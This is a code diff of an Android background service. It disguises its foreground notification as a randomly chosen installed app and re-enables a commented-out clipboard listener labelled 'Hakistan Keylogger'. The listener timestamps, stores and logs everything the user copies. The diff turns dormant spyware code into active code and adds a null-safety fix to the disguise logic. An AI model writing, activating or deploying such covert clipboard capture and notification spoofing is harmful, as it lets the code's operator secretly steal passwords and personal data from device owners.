@@ -101,93 +101,78 @@ public class InGService extends IntentService {
 
         PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
         if (powerManager != null) {
-            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
-                    "ExampleApp:Wakelock");
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ExampleApp:Wakelock");
         }
         wakeLock.acquire(3600000);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Log.d(TAG, "onCreate: Crearing Notification");
+            Log.d(TAG, "onCreate: Creating Notification");
             ApkInfoExtractor apkInfoExtractor = new ApkInfoExtractor(getApplicationContext());
 
             List<String> arrayList = new ApkInfoExtractor(getApplicationContext()).GetAllInstalledApkInfo();
 
             Random random = new Random();
-            int randomNumber = random.nextInt(arrayList.size() - 5) + 5;
 
-            String PACKAGE_NAME = getApplicationContext().getPackageName();
+            if (arrayList.size() >= 5) {
+                int randomNumber = random.nextInt(arrayList.size() - 5) + 5;
 
-            ApplicationPackageName = (String) arrayList.get(randomNumber);
+                String PACKAGE_NAME = getApplicationContext().getPackageName();
+                ApplicationPackageName = (String) arrayList.get(randomNumber);
 
-            while (PACKAGE_NAME.equals(ApplicationPackageName)) {
+                while (PACKAGE_NAME.equals(ApplicationPackageName)) {
+                    int randomNumber1 = random.nextInt(arrayList.size() - 5) + 5;
+                    ApplicationPackageName = (String) arrayList.get(randomNumber1);
+                }
 
-                Random random1 = new Random();
-                int randomNumber1 = random1.nextInt(arrayList.size() - 5) + 5;
+                String ApplicationLabelName = apkInfoExtractor.GetAppName(ApplicationPackageName);
 
-                ApplicationPackageName = (String) arrayList.get(randomNumber1);
+                Intent notificationIntent = getPackageManager().getLaunchIntentForPackage(ApplicationPackageName);
+                PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
 
+                Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+                        .setContentTitle(ApplicationLabelName)
+                        .setContentText(ApplicationLabelName + " is running...")
+                        .setSmallIcon(R.drawable.ic_android_black_24dp)
+                        .setContentIntent(pendingIntent)
+                        .build();
+
+                startForeground(1, notification);
+            } else {
+                Log.e(TAG, "List size is less than 5");
+                // Handle the case when the list size is less than 5
             }
-
-            String ApplicationLabelName = apkInfoExtractor.GetAppName(ApplicationPackageName);
-            // Drawable drawable = apkInfoExtractor.getAppIconByPackageName(ApplicationPackageName);
-
-            Log.i("MainActivity", ApplicationLabelName + "    " + ApplicationPackageName);
-
-
-            Intent notificationIntent = getPackageManager().getLaunchIntentForPackage(ApplicationPackageName);
-            PendingIntent pendingIntent = PendingIntent.getActivity(this,
-                    0, notificationIntent, 0);
-
-
-            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle(ApplicationLabelName)
-                    .setContentText(ApplicationLabelName + " is running...")
-                    .setSmallIcon(R.drawable.ic_android_black_24dp)
-                    .setContentIntent(pendingIntent)
-                    .build();
-
-            startForeground(1, notification);
         }
-/*
+
         final ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         if (clipboard != null) {
-            clipboard.addPrimaryClipChangedListener( new ClipboardManager.OnPrimaryClipChangedListener() {
+            clipboard.addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() {
                 public void onPrimaryClipChanged() {
-
                     DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
                     String time = df.format(Calendar.getInstance().getTime());
 
                     SharedPreferences.Editor editor = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();
 
                     SharedPreferences prefs = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
-                    String perviousData = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.
+                    String perviousData = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");
 
                     String a = clipboard.getText().toString();
 
-
-                    String dataToSave  = perviousData + "\n\nTime: "+time+"\nData In ClipBoard: "+a+"\n\n";
+                    String dataToSave  = perviousData + "\n\nTime: "+time+"\nData In Clipboard: "+a+"\n\n";
 
                     editor.putString(MY_PREFS_STRING_KEY, dataToSave);
 
-
-                    Long perviousNotiCountData = prefs.getLong(MY_PREFS_Clips_Count_KEY,0);//"No name defined" is the default value.
-
-
+                    Long perviousNotiCountData = prefs.getLong(MY_PREFS_Clips_Count_KEY, 0);
                     Long tosaveCount = perviousNotiCountData + 1;
 
                     editor.putLong(MY_PREFS_Clips_Count_KEY, tosaveCount);
-                    //editor.putInt("idName", 12);
                     editor.apply();
 
-
-                     Log.i(TAG,"Copy:\n"+a);
+                    Log.i(TAG, "Copy:\n" + a);
                 }
             });
         }
-
-
- */
     }
+
 
 
     @Override
